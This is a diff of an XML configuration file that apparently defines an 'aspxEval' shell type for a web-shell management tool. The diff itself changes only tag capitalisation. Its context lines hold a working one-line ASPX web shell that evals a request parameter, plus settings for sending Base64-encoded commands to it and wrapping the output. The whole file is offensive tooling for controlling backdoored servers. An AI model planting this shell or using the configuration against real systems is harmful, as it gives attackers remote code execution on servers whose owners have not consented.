@@ -1,11 +1,11 @@
 ﻿<?xml version="1.0" encoding="utf-8"?>
-<CustomShellType>
-  <BasicSetting>
+<customShellType>
+  <basicSetting>
     <name>aspxEval</name>
     <serviceExample><![CDATA[<%@ Page Language="Jscript"%><%eval(Request.Item["a"],"unsafe");%>]]></serviceExample>
     <mainCodeParam location="Body" encrymode="None" >passwd</mainCodeParam>
-  </BasicSetting>
-  <MainCodeSetting>
+  </basicSetting>
+  <mainCodeSetting>
 	<funcCodeParam location="Body" encrymode="Base64" >funcCode</funcCodeParam>
     <item><![CDATA[Response.Write("->|");
 var err;
@@ -20,5 +20,5 @@ catch(err)
 }
 Response.Write("|<-");
 Response.End();]]></item>
-  </MainCodeSetting>
-</CustomShellType>
+  </mainCodeSetting>
+</customShellType>
